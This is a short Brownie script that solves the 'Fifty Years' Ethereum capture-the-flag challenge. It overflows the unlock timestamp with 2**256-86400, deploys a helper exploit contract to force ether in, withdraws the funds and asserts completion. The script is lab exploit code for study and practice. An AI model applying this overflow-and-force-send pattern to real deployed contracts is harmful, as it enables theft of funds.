from brownie import FiftyYearsChallenge, Rf_Exploit, accounts


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = FiftyYearsChallenge.deploy(
        player, {'from': deployer, 'value': '1 ether'})

    contract.upsert(2, 2**256-86400, {'from': player, 'value': 1})
    contract.upsert(3, 0, {'from': player, 'value': 2})
    Rf_Exploit.deploy(contract, {'from': player, 'value': 2})
    contract.withdraw(2, {'from': player})

    assert contract.isComplete() == True
